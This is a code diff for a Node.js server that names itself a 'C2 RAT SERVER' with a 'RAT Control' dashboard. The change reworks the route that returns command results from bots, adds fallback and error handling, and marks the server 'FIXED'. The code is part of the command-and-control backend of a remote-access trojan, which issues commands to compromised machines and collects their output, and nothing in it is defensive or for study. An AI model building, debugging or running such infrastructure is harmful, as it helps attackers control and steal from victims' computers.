@@ -366,29 +366,58 @@ app.post('/api/command/bulk', auth, async (req, res) => {
     res.json({ results });
 });
 
+// ============================================================
+//  API /api/results/:cmd_id - FIXED
+// ============================================================
 app.get('/api/results/:cmd_id', auth, (req, res) => {
     const cmdId = req.params.cmd_id;
     console.log(`[API] Looking for result: ${cmdId}`);
     
-    let cmd = DB.commands.find(c => c.cmd_id === cmdId);
-    if (cmd) {
-        console.log(`[API] Found result: ${cmd.status}`);
-        return res.json(cmd);
-    }
-    
-    const pending = DB.pending_commands.find(p => p.cmd_id === cmdId);
-    if (pending) {
-        console.log(`[API] Found in pending`);
-        return res.json({
-            cmd_id: pending.cmd_id,
+    try {
+        // Tìm trong commands
+        let cmd = DB.commands.find(c => c.cmd_id === cmdId);
+        if (cmd) {
+            console.log(`[API] Found result: ${cmd.status}`);
+            return res.json({
+                cmd_id: cmd.cmd_id,
+                result: cmd.result || null,
+                status: cmd.status || 'pending',
+                issued_at: cmd.issued_at || Date.now(),
+                executed_at: cmd.executed_at || null,
+                command: cmd.command || 'unknown'
+            });
+        }
+        
+        // Tìm trong pending commands (fallback)
+        const pending = DB.pending_commands.find(p => p.cmd_id === cmdId);
+        if (pending) {
+            console.log(`[API] Found in pending`);
+            return res.json({
+                cmd_id: pending.cmd_id,
+                result: null,
+                status: 'pending',
+                issued_at: pending.issued_at,
+                executed_at: null,
+                command: pending.command || 'unknown'
+            });
+        }
+        
+        console.log(`[API] Command ${cmdId} not found`);
+        res.json({
+            cmd_id: cmdId,
             result: null,
-            status: 'pending',
-            issued_at: pending.issued_at
+            status: 'not_found',
+            issued_at: Date.now(),
+            executed_at: null,
+            command: 'unknown'
+        });
+    } catch (error) {
+        console.error(`[API] Error: ${error.message}`);
+        res.status(500).json({ 
+            error: 'Internal server error', 
+            message: error.message 
         });
     }
-    
-    console.log(`[API] Command ${cmdId} not found`);
-    res.json({});
 });
 
 app.get('/api/results/latest/:bot_id', auth, (req, res) => {
@@ -577,7 +606,7 @@ async function startServer() {
     
     server.listen(PORT, '0.0.0.0', () => {
         console.log('='.repeat(50));
-        console.log('  ✅ C2 RAT SERVER STARTED');
+        console.log('  ✅ C2 RAT SERVER STARTED (FIXED)');
         console.log(`  Port: ${PORT}`);
         console.log(`  Dashboard: http://localhost:${PORT}/`);
         console.log(`  RAT Control: http://localhost:${PORT}/rat`);
